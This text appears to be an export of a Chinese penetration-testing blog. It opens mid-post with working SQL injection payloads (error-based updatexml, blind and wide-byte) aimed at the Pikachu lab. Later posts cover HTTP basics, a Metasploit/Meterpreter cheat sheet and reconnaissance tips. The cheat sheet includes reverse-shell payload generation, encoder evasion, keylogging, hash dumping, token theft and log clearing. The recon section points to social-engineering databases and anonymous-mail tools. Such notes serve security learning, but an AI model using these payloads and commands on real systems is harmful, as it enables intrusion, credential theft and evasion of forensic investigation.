2、爆数据库当前用户 k’ and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)# 3、爆数据库 k’ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) # 4、爆表 获取数据库表名，输入：k’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’)),0)#，但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示 输入k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’limit 0,1)),0)#更改limit后面的数字limit 0完成表名遍历。 5、爆字段 获取字段名，输入：k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit 2,1)),0)# 6、爆字段内容 获取字段内容，输入：k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# extractvalue（） :函数也是MYSQL对XML文档数据进行查询的XPATH函数. floor（）:MYSQL中用来取整的函数. insert注入 前端注册的信息最终会被后台通过insert这个操作插入数据库，后台在接受前端的注册数据时没有做防SQL注入的处理 进入网站注册页面，填写网站注册相关信息，通过Burp抓包在用户名输入相关payload oldboy’or updatexml(1,concat(0x7e,(命令)),0) or’ \\1. 爆表名 oldboy’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’ \\2. 爆列名 ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit 2,1)),0) or’ \\3. 爆内容 ‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’ 等同 ‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ‘1’=’1’’ uodate注入 与insert注入的方法大体相同，区别在于update用于用户登陆端，insert用于用于用户注册端 ‘ or updatexml(0,concat(0x7e,(database())),0) or’ dalete注入 一般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入 delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0) http header注入 User-Agent输入payload Mozilla’ or updatexml(1,concat(0x7e,database ()),0) or ‘html&gt; cookie注入 如果后端获取Cookie后放在数据库中进行拼接，那么这也将是一个SQL注入点 在 ant[uname]=admin后添加一个’观察反馈的MYSQL的语法报错，发现了存在SQL注入漏洞，在设置Payload ‘and updatexml (1,concat(0x7e,database()),0)#,观察报错和之前是否相同 盲注(base on boolian)、盲注(base on time) 布尔盲注 在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。 输入语句select ascii(substr(database(),1,1))&gt;xx;通过对比ascii码的长度，判断出数据库表名的第一个字符。 注: substr()函数 string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被返回字符串的长度。 在实际操作中通常不会使用手动盲注的办法，可以使用sqlmap等工具来增加盲注的效率。 时间盲注 payload: vince’ and sleep(x)# vince’ and if(substr(database(),1,1)=’X’ (猜测点)’,sleep(10),null# 输入后，如果猜测真确，那么就会响应10秒，如果错误会立刻返回错误。 输入：vince’ and if(substr(database(),1,1)=’p’,sleep(10),null)# 在web控制台下，判断出database的表名的一个字符为p 宽字节注入 当我们把php.ini文件里面的magic_quotes_gqc参数设为ON时，所有的’（单引号），”(双引号)，(反斜杠)和null字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 其中\\的十六进制是 %5C ，当我们在单引号前面加上%df的时候，最终就会变成 運’，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df 是一个宽字符，也就是運，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。 ‘ =======&gt;&#39;单引号转义后占两个字节，所以我们需要通过繁体字%df构造两个字节,最终用運干掉了\\，也就是说被運占领了\\ 所以最后在页面也不会显示出来. 哪些地方没有魔术引号的保护？ （1） $_SERVER 变量 PHP5的$_SERVER变量缺少magic_quotes_gqc的保护，导致近年来X-Forwarded-For的漏洞猛爆，所以很多程序员考虑过滤X-Forwarded-For，但是其它的变量呢？ （2）getenv()得到的变量（使用类似$_SERVER 变量） （3）$HTTP_RAW_POST_DATA与PHP输入、输出流 内置变量爆数据库类型 “User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型 方法：在注入点之后提交 and user&gt;0 错误信息： ​ Microsoft OLE DB Provider for SQL Server 错误’80040e21’（MS SQL数据库） ​ 将nvarchar值’’转换为数据类型为int的列时发生语法错误。（Access数据库） 1.6实战 access 数据库https://www.jianshu.com/p/fc1e26d3ad45 mysql 数据库https://www.jianshu.com/p/f98ab1b4b12e 1.7获取Web路径(1)一般可以在变量后面加上单引号、改变参数类型、增加参数位数等来造成MySQL数据库出错，爆出Web物理路径。 （2）通过扫描器扫web服务器遗留文件 php.php、info.php、phpinfo.php、test.php （3）利用搜索引擎来查找Web目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在Google或百度中搜索“mysql site:.com”或“warning site:.com,error site:***.com.cn”等。 这里使用“error site:***.com”关键字进行查询，从搜索结果中得到了网站的物理路径为“E:\\pujing2015”。 (4) 漏洞暴路径，例如通过网站后台查看网站Web路径、CC攻击暴路径等. (6)通过配置文件找网站路径,在百度里面输入***配置文件,如:IIS6.0配置文件，可以找到: C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml 和C:\\WINDOWS\\system32\\inetsrv\\MetaBase.bin 这两个配置文件（小技巧:在百度里面输入:load_file()常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）。","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"应用程序技术","date":"2020-09-12T12:00:28.000Z","path":"2020/09/12/应用程序技术/","text":"Web 应用程序技术Web应用程序使用各种不同的技术实现其功能。本章简要介绍渗透侧试员在攻击Web应用程序时可能遇到的关键技术。我们将分析HTTP协议、服务器和客户端常用的技术以及用于在各种情形下呈现数据的编码方案。这些技术大都简单易懂，掌握其相关特性对于向Web应用程序发动有效攻击极其重要。 1、cookie与session的区别1、cookie数据存放在客户的浏览器上，session数据放在服务器上。 2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗考虑到安全应当使用session。 3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用COOKIE。 4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。 5、所以个人建议：将登陆信息等重要信息存放为SESSION 其他信息如果需要保留，可以放在COOKIE中 2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X_Forwarded_for、Location各请求头的含义Connection表示持久的客户端与服务连接。（close关闭） get：访问的地址，里面有=什么什么的是参数一般可以插入payllody，可以插入攻击代码如果没有一般没漏洞，HTTP版本1.1必须使用host请求头get发送的数据在url公开 post:一般为表单提交；通过post提交的数据在url不可见； accept:表示浏览器支持的MIME类型，优先顺序是从左到右表示我当前的浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体类型时，会返回406 Not Acceptable 响应。当然使用了 / 表示愿意接受任意类型的资源，所以应不会看到这个响应。另外，这里的 q 表示权重，权重在 0-1 之间，（顺序为重大到小优先顺序）可以理解成客户端在这些给出的类型中，想优先接受什么类型，可以服务器就可以根据客户端的需要返回相应的资源。 如果没有，则默认为 1 。这里前面几个类型都没有标明，则默认都是 1 ，表示优先这些类型，后面的 0.9 表示前面都没有就用这个，最后的 0.8 表示如果都没有，那么任意的类型都行） Referer：向服务器提交跳转链接所在地址，如果用户时通过链接跳转到当前页面，此请求域为链接所在界面的URL。 当访问某个网站是通过什么访问的，有时候一定要从某个地方访问挑战，我们便可以改为从设定的地方访问 Use-Agent:用来收集数据例如什么电脑，什么浏览器,MAC地址等等用来取证 Host:向服务器提交（服务器）主机和端口号 Cookie:第一次访问可能不带，第二次调用本地记录向客户端发送来验证身份 X_Forwarded_for：伪造ip登录，也可以伪造多IP登录例如127.0.$设置个字典$.$设置个字典$用于过waf绕后台抓包时添加 Location: 这个消息头用于在重定向响应(那些状态码以3开头的响应)中说明重定向的目标。跳转 3、常用 http 支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述HTTP请求的常用方法有：GET方法、POST方法、HEAD方法、PUT方法、DELETE方法、CONNECT方法、OPTIONS方法、TRACE方法。 Head:与get相似，检查资源是否存在。waf一般不拦截 Options:查看当前网站支持的请求方法。用来检测服务器性能 Put：把文件上传到服务器（后一个会覆盖上一个0，一般用来改资源） get：从服务器获得数据返回前进不影响 post:向服务器传送数据后一个资源不会覆盖上一个返回前会一直向服务器发送请求（一般用增加资源） TRACE.这种方法主要用于诊断。服务器应在响应主体中返回其收到的请求消息的具体内容。这种方法可用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器。 4、cookie头里面的secure与HttpOnly项分别代表什么含义Secure：如果设置这个属性.则仅在HTTPS请求中提交cookie. HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问cookie. 5、状态码每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一 位数字，可将状态码分为以下5类。 1xx -提供信息。 2xx—请求被成功提交。 3xx—客户端被重定向到其他资源。 4xx-请求包含某种错误。 5xx—服务器执行请求时遇到错误。 还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web 应用程序时最有可能遇到的状态码及其相关的原因短语。 100Continue。当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。 200Ok。本状态码表示已成功提交请求，且响应主体中包含请求结果。 201Created. PUT请求的响应返回这个状态码，表示请求已成功提交。 301Moved Permanently。本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 302Found。本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. 304Not Modified。本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工f-None-Match消息头确定客户端是否拥有最新版本的资源。 400Bad Request。本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在URL中插人一个空格符)，可能会遇到这个状态码。 401Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。 403Forbidden。本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。 404Not Found。本状态码表示所请求的资源并不存在。 ]405Method Not Allowed。本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。 413Request Entity Too Large。如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串.则本状态码表示请求主体过长，服务器无法处理。 414Request URI Too Long。与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。 500Internal Server Error。本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。 503Service Unavailable。通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。","tags":[]},{"title":"Metasploit","date":"2020-09-12T11:59:54.000Z","path":"2020/09/12/Metasploit/","text":"msf的使用Msfconsole:是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项** metasploit就是一个免费的漏洞框架，利用他人人都是黑客，使用者不需要任何编程基础就可以使用 check：检测漏洞是否存在msf常用命令:show exploits 列出metasploit框架中的所有渗透攻击模块。 show payloads 列出metasploit框架中的所有攻击载荷。 show auxiliary 列出metasploit框架中的所有辅助攻击载荷。 search name 查找metasploit框架中所有的渗透攻击和其他模块。 info 展示出制定渗透攻击或模块的相关信息。 use name 装载一个渗透攻击或模块。 LHOST 你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。 RHOST 远程主机或是目标主机。 set function 设置特定的配置参数（EG：设置本地或远程主机参数）。 setg function 以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。 show options 列出某个渗透攻击或模块中所有的配置参数。 show targets 列出渗透攻击所有支持的目标平台。 set target num 指定你所知道的目标的操作系统以及补丁版本类型。 set payload name 指定想要使用的攻击载荷。 show advanced 列出所有高级配置选项。 set autorunscript migrate -f. 在渗透攻击完成后，将自动迁移到另一个进程。 check 检测目标是否选定渗透攻击存在相应的安全漏洞。 exploit 执行渗透攻击或模块来攻击目标。 exploit -j 在计划任务下进行渗透攻击（攻击将在后台进行）。 exploit -z 渗透攻击完成后不与回话进行交互。 exploit -e encoder 制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。 exploit -h 列出exploit命令的帮助信息。 sessions -l 列出可用的交互会话（在处理多个shell时使用）。 sessions -l -v 列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。 sessions -s script 在所有活跃的metasploit会话中运行一个特定的metasploit脚本。 sessions -K 杀死所有活跃的交互会话。 sessions -c cmd 在所有活跃的metasploit会话上执行一个命令。 sessions -u sessionID 升级一个普通的win32 shell到metasploit shell。 db_create name 创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。 db_connect name 创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。 db_namp 利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。 db_autopwn -h 展示出db_autopwn命令的帮助信息。 db_autopwn -p -r -e 对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。 db_destroy 删除当前数据库。 db_destroy user：passwd@host：port/database 使用高级选项来删除数据库。 metasploit命令 help 打开meterpreter使用帮助。 run scriptname 运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。 sysinfo 列出受控主机的系统信息。 ls 列出目标主机的文件和文件夹信息。 use priv 加载特权提升扩展模块，来扩展metasploit库。 ps 显示所有运行的进程以及相关联的用户账户。 migrate PID 迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。 use incognito 加载incognito功能（用来盗窃目标主机的令牌或假冒用户） list_tokens -u 列出目标主机用户的可用令牌。 list_tokens -g 列出目标主机用户组的可用令牌。 impersonate_token DOMAIN_NAME\\USERNAME 假冒目标主机上的可用令牌。 steal_token PID 盗窃给定进程的可用令牌并进行令牌假冒。 drop_token 停止假冒当前令牌。 getsystem 通过各种攻击向量来提升系统用户权限。 execute -f cmd.exe -i 执行cmd.exe命令并进行交互。 execute -f cmd.exe -i -t 以所有可用令牌来执行cmd命令并隐藏该进程。 rev2self 回到控制目标主机的初始用户账户下。 reg command 在目标主机注册表中进行交互，创建，删除，查询等操作。 setdesktop number 切换到另一个用户界面（该功能基于那些用户已登录）。 screenshot 对目标主机的屏幕进行截图。 upload file 向目标主机上传文件。 download file 从目标主机下载文件。 keyscan_start 针对远程目标主机开启键盘记录功能。 keyscan_dump 存储目标主机上捕获的键盘记录。 keyscan_stop 停止针对目标主机的键盘记录。 getprivs 尽可能多的获取目标主机上的特权。 uictl enable keyboard/mouse 接管目标主机的键盘和鼠标。 background 将你当前的metasploit shell转为后台执行。 hashdump 导出目标主机中的口令哈希值。 use sniffer 加载嗅探模式。 sniffer_interfaces 列出目标主机所有开放的网络端口。 sniffer_dump interfaceID pcapname 在目标主机上启动嗅探。 sniffer_start interfaceID packet-buffer 在目标主机上针对特定范围的数据包缓冲区启动嗅探。 sniffer_stats interfaceID 获取正在实施嗅探网络接口的统计数据。 sniffer_stop interfaceID 停止嗅探。 add_user username password -h ip 在远程目标主机上添加一个用户。 clearev 清楚目标主机上的日志记录。 timestomp 修改文件属性，例如修改文件的创建时间（反取证调查）。 reboot 重启目标主机。 MSFpayload命令 msfpayload -h msfpayload的帮助信息。 msfpayload windows/meterpreter/bind_tcp O 列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。 msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe 创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。 msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw 创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。 msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c 创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。 msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java 创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。 msfencode命令 mefencode -h 列出msfencode的帮助命令。 msfencode -l 列出所有可用的编码器。 msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho) 显示编码缓冲区的格式。 msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。 msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe 创建一个经过多种编码格式嵌套编码的攻击载荷。 msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c 创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。 MSFcli命令 msfcli | grep exploit 仅列出渗透攻击模块。 msfcli | grep exploit/windows 仅列出与windows相关的渗透攻击模块。 msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E 对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听 如何更新MSF1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http://www.kali.org/downloads/kail下载地址： [https://pan.baidu.com/s/1c05BnlI http://cdimage.kali.org/kali-weekly/ http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/ 注意: 测试系统下载下来后是zip格式的。解压后使用VM打开。如果是VMware的，直接打开用VMware打开Metasploitable.vmx文件即可。Metasploitable系统的默认账号和密码是msfadmin:msfadmin如果你想了解更多关于Metasploitable的信息，你可以去下面这个网站：https://community.rapid7.com/docs/DOC-1875 2🐱‍🚀、加入更新源一、替换yum源，把kail原有更新源#号注释掉 root@kali:~#vi /etc/apt/sources.list（这是修改更新源） （更新源全国各地都不一样，因为当地的电信，移动防火墙会拦截） kali-rolling版本：（中科大的就够用了，个人按需吧） # kali官方源 deb http://http.kali.org/ kali-rolling main non-free contrib deb-src http://http.kali.org/ kali-rolling main non-free contrib #中科大源 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib shift+：wq保存退出 添加数字签名wget archive.kali.org/archive-key.asc //下载签名 apt-key add archive-key.asc //安装签名 注：如果添加数字签名还提示无法安装可删除原有msf root@kali:~# apt remove metasploit-framework 注：卸载过程中无法获得锁/var/cache/apt/archives/lock - open (11:资源暂时不可用) 无法对目录/var/cache/apt/archives/加锁 root@kali:~# sudo rm /var/cache/apt/archives/lock //进行强制解锁 root@kali:~# sudo rm /var/cache/apt/archives/ 安装msf框架oot@bogon:~# apt-get update root@kali:~# apt-get install metasploit-framework//安装msf框架 选择yes说明更新成功 root@kali:~#msfconsole //发现有提示数据库未启动，退出msf启动数据库 root@kali:~# systemctl start postgresql //启动数据库 root@kali:~# systemctl enable postgresql //允许开机自启动 root@kali:~# msfdb init //构建数据库缓存 root@kali:~#msfconsole 注意：如果更新完msf出现才下问题 root@kaliew:~# msfconsole [*] Bundler failed to load and returned this error: ‘cannot load such file – bundler/setup’ [*] You may need to uninstall or upgrade bundler 解决方法： root@kaliew:~# sudo gem install bundler root@kaliew:~# bundle update celluloid MSF之meterpreter后期攻击使用方法","tags":[]},{"title":"信息收集","date":"2020-09-12T11:48:18.000Z","path":"2020/09/12/信息收集/","text":"信息收集1.1 第一步 域名探测​ 当我们要对一个站点进行渗透测试之前，一般渗透测试人员常见方法是直接通漏洞扫描器来对指定目标站点进行渗透，当指定的目标站点无漏洞情况，渗透测试员就需要进行信息收集工作来完成后期的渗透。 ​ 目前一般域名漏洞扫描工具有AWVS、APPSCAN、Netspark、WebInspect、Nmap、Nessus、天镜、明鉴、WVSS、RSAS等，后面会分开给大家讲解。 1.2 第二步 子域名探测根据主域名，可以获取二级域名、三级域名、……主要姿势可以有： 【1】DNS域传送漏洞（不得不称赞） ​ 如果存在，不仅能搜集子域名，还能轻松找到一枚洞，这样子的好事百试不厌。如果SRC一级域名不多，直接在kali下 dnsenum oldboyedu.com 。 工具说明及用法可参考如下： ​ dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。 参数说明： -h 查看工具使用帮助 –dnsserver 指定域名服务器 –enum 快捷选项，相当于”–threads 5 -s 15 -w” –noreverse 跳过反向查询操作 –nocolor 无彩色输出 –private 显示并在”domain_ips.txt”文件结尾保存私有的ips –subfile 写入所有有效的子域名到指定文件 -t, –timeout tcp或者udp的连接超时时间，默认为10s（时间单位：秒） –threads 查询线程数 -v, –verbose 显示所有的进度和错误消息 -o ,–output 输出选项，将输出信息保存到指定文件 -e, –exclude 反向查询选项，从反向查询结果中排除与正则表达式相符的PTR记录，在排查无效主机上非常有用 -w, –whois 在一个C段网络地址范围提供whois查询 -f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典 相关解析记录说明可参考：https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html 【2】备案号查询 ​ 这算是奇招吧，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。 网站备案查询地址：http://www.beianbeian.com 【3】SSL证书 ​ 通过查询SSL证书，获取的域名存活率很高，这应该也是不错的思路。 查询网址: https://myssl.com/ssl.html 和https://www.chinassl.net/ssltools/ssl-checker.html 【4】google搜索C段 ​ 这招用的比较少，国内没条件的就用bing或百度吧（国内站点足矣），在没什么进展的时候或许会有意外惊喜。 方法一：参考GoogleHack用法 方法二：用k8工具，前提条件记得注册bing接口 什么是C段：比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1127.127.127.255 这 1255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255任何一个站 之后提权来嗅探得到127.4 这台服务器的密码 甚至3389连接的密码后台登录的密码 如果运气好会得到很多的密码… 【5】APP提取 ​ 反编译APP进行提取相关IP地址，此外在APP上挖洞的时候，可以发现前面招式找不到的域名，在APP里面有大量的接口IP和内网 IP，同时可获取不少安全漏洞。 【6】微信公众号 ​ 企业的另一通道，渗透相关公众号，绝对会有意外收获：不少漏洞+域名，有关Burp如何抓取微信公众号数据可参考 Burp APP抓包。 【7】字典枚举法 ​ 字典枚举法是一种传统查找子域名的技术，这类工具有 DNSReconcile、Layer子域名挖掘机、DirBuster等。 【8】公开DNS源 Rapid7下Sonar项目发布的： https://scans.io/study/sonar.fdns_v2。 DNS历史解析： https://dnsdb.io/zh-cn/ 【9】威胁情报查询 华为安全情报 https://isecurity.huawei.com 1.3 第三步 敏感信息收集【1】Web源代码泄露 ​ 通过工具暴破相关Web源代码泄露，流程如下： ​ 最想强调的是github信息泄露了，直接去github上搜索，收获往往是大于付出。可能有人不自信认为没能力去SRC挖洞，可是肯定不敢说不会上网不会搜索。github相关的故事太多，但是给人引出的信息泄露远远不仅在这里：github.com、rubygems.org、pan.baidu.com… QQ群备注或介绍等，甚至混入企业qq工作群… ​ 然后说再多，也没这个好用：https://sec.xiaomi.com/article/37 全自动监控github 信息泄露收集可能会用到如下地址： 网盘搜索：http://www.pansou.com/或https://www.lingfengyun.com/ 网盘密码破解可参考：https://www.52pojie.cn/thread-763130-1-1.html 社工信息泄露：https://www.instantcheckmate.com/、http://www.uneihan.com/ 源码搜索：https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net 钟馗之眼： https://www.zoomeye.org/ 天眼查 https://www.tianyancha.com/ 其它：威胁情报：微步在线、 ti.360.cn、 Virustotal 【2】邮箱信息收集 ​ 收集邮箱信息主要有两个作用：1.通过发现目标系统账号的命名规律，可以用来后期登入其他子系统。2.爆破登入邮箱用。 ​ 通常邮箱的账号有如下几种生成规律： 比如某公司有员工名叫做“张小三”，它的邮箱可能如下： &#122;&#104;&#97;&#x6e;&#103;&#120;&#105;&#97;&#x6f;&#115;&#x61;&#110;&#64;&#120;&#x78;&#120;&#46;&#99;&#111;&#109; &#x78;&#x69;&#97;&#x6f;&#115;&#97;&#x6e;&#x2e;&#x7a;&#x68;&#97;&#110;&#x67;&#x40;&#x78;&#x78;&#x78;&#x2e;&#99;&#111;&#x6d; &#x7a;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#110;&#64;&#x78;&#x78;&#x78;&#x2e;&#x63;&#x6f;&#109; ​ 当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，&#104;&#114;&#x40;&#x78;&#x78;&#120;&#46;&#99;&#x6f;&#x6d;/kefu@xxx.com,这种邮箱有时会存在弱口令，在渗透时可额外留意一下。我们可以通过手工或者工具的方式来确定搜集邮箱： 手工的方式： 1.可以到百度等搜索引擎上搜索邮箱信息 2.github等第三方托管平台 3.社工库 工具方式： ​ 在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester可用于搜索Google、Bing和PGP服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：https://github.com/laramies/theHarvester · 注：**python -m pip install -r requirements.txt** 导入相关配置，python3.6版本 使用方式很简单： ./theHarvester.py -d 域名 -1 1000 -b all 【3】历史漏洞收集 ​ 仔细分析，大胆验证，发散思维，对企业的运维、开发习惯了解绝对是有很大的帮助。可以把漏洞保存下来，进行统计，甚至炫一点可以做成词云展示给自己看，看着看着或者就知道会有什么漏洞。 wooyun 历史漏洞库：http://www.anquan.us/ 漏洞银行：https://www.bugbank.cn/ 360补天：https://www.butian.net/ 教育行业漏洞报告平台（Beta）https://src.edu-info.edu.cn/login/ 【4】工具信息收集 如：7kbscan、破壳Web极速扫描器等 1.4 第四步 指纹识别、Waf、CDN识别​ 在这个过程中，可以加入端口扫描、敏感文件扫描之类的操作，工具可自由选择，如： 御剑WEB指纹识别系统、whatweb、Wapplyzer等工具。 ​ 1、在线识纹识别： http://whatweb.bugscaner.com/look/ http://www.yunsee.cn/finger.html 2、Waf识别 github.com/EnableSecurity/wafw00f 3、CDN识别 https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py 1.5 第五步 资产梳理​ 有了庞大的域名，接下来就是帮助SRC梳理资产了。域名可以先判断存活，活着的继续进行确定IP环节。根据IP的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址： SRC众测平台 国际漏洞提交平台 https://www.hackerone.com/ BugX区块链漏洞平台 http://www.bugx.org/ Gsrc瓜子src https://security.guazi.com/ 区块链安全响应中心 https://dvpnet.io/ CNVD国家信息安全漏洞平台 http://www.cnvd.org.cn/ 漏洞银行：https://www.bugbank.cn/ 360补天：https://www.butian.net/ 教育行业漏洞报告平台（Beta）https://src.edu-info.edu.cn/login/ 国内平台 知道创宇Seebug漏洞平台 https://www.seebug.org/ 工控系统行业漏洞平台 http://ivd.winicssec.com/ 打造中文最大exploit库 http://www.expku.com/ 为数不多的漏洞管理插件收集平台 http://www.bugscan.net/source/template/vulns/ 一家管理漏洞收集的平台 http://www.0daybank.org/ 国外平台 国际漏洞提交平台 https://www.hackerone.com/ xss poc http://xssor.io/ oday漏洞库 https://www.0day.today/ 路由器漏洞库 http://routerpwn.com/ cve漏洞平台 http://cve.mitre.org/ 威胁情报 安全数据交流平台 https://www.secsilo.com/ 华为安全情报 https://isecurity.huawei.com/sec/web/intelligencePortal.do 威胁情报共享平台 https://www.threatcrowd.org/ 被黑站点统计 http://www.hacked.com.cn/ 社工库 微信伪造 http://www.jietuyun.com/ 任意邮箱发送 http://tool.chacuo.net/mailanonymous和https://emkei.cz/ 临时邮箱 http://www.yopmail.com/ 邮箱池群 http://veryvp.com/ 社工库 http://www.uneihan.com/ 1.6 G**oogleHack**1.6.1 功能介绍​ 